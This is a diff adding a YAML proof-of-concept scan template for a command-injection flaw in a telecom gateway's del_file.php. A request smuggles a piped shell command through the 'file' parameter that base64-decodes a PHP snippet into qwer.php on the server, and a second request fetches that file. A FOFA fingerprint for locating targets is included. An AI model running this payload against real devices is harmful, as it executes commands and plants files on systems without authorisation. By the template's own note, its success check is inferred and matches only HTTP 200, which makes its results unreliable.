@@ -1,0 +1,28 @@
+id: poc-6454544239
+info:
+  name: 电信网关del_file.php存在命令执行漏洞
+  author: hacktwo
+  severity: critical
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: rce,unknown
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: ''
+    fofa: body="a:link{text-decoration:none;color:orange;}"
+http:
+- raw:
+  - GET /manager/newtpl/del_file.php?file=1.txt|echo%20PD9waHAgZWNobyBtZDUoJzIxMzQ1Jyk7dW5saW5rKF9fRklMRV9fKTs/PgoK%20|%20base64%20-d%20>%20qwer.php HTTP/1.1
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
+- raw:
+  - GET /manager/newtpl/qwer.php HTTP/1.1
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
